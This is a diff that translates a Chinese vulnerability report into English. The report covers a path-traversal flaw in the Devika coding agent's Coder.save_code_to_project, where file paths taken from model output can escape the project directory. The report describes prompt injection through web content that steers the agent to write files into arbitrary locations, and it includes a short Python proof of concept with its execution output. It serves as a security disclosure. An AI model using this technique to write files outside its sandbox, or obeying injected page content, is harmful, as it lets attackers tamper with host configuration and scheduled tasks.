@@ -1,27 +1,27 @@
-# Devika：Coder 写文件路径逃逸项目目录（相对 ../ 与绝对路径）
+# Devika: Coder file-write paths escape the project directory (../ and absolute paths)
 
-## 描述
+## Description
 
-`Coder.save_code_to_project`（src/agents/coder/coder.py:68-80）把 LLM 输出解析出的 `file` 字段直接拼进 `os.path.join(self.project_dir, project_name, file['file'])`，无包含性校验：`../` 段与 POSIX 绝对路径都原样存活并写出项目目录之外。
+`Coder.save_code_to_project` (src/agents/coder/coder.py:68-80) joins the LLM-parsed `file` field directly into `os.path.join(self.project_dir, project_name, file['file'])` with no containment validation: both `../` segments and POSIX absolute paths survive and write outside the project directory.
 
-## 影响
+## Impact
 
-Agent 在浏览网页/处理任务时，页面内容可经提示注入引导模型输出恶意 `file` 字段，使 Devika 服务器以自身权限在任意可写路径落盘文件（覆盖配置、写入定时任务位置等）。攻击者输入 = agent 处理的不可信 web 内容；被击穿的边界 = 项目目录。
+While the agent browses web pages or processes tasks, page content can steer the model's output through prompt injection to carry a malicious `file` field, making the Devika server write files at any writable path with its own privileges (overwriting configuration, dropping files into scheduler locations, etc.). The attacker-controlled input is the untrusted web content the agent processes; the violated boundary is the project directory.
 
 ## PoC
 
 ```bash
-cd <devika 源码目录>
+cd <devika source directory>
 python - << 'PYEOF'
 import os, sys
 sys.path.insert(0, ".")
 from src.agents.coder.coder import Coder
 
 c = Coder("repro")
-# 模型输出被引导携带 ../ 的 file 字段（正常输出应是纯文件名）
+# model output steered to carry a ../ file field (normal output is a bare filename)
 c.save_code_to_project(
     [{"file": "../poc-escaped/PWNED_CW.txt", "code": "written outside"}], "repo")
-# 绝对路径同样存活
+# absolute paths survive as well
 c.save_code_to_project(
     [{"file": "/tmp/devika_cw_absolute.txt", "code": "absolute escape"}], "repro")
 
@@ -30,7 +30,7 @@ print("absolute escape:", os.path.exists("/tmp/devika_cw_absolute.txt"))
 PYEOF
 ```
 
-## 执行结果
+## Execution result
 
 ```
 relative escape (data/projects/poc-escaped/PWNED_CW.txt): True
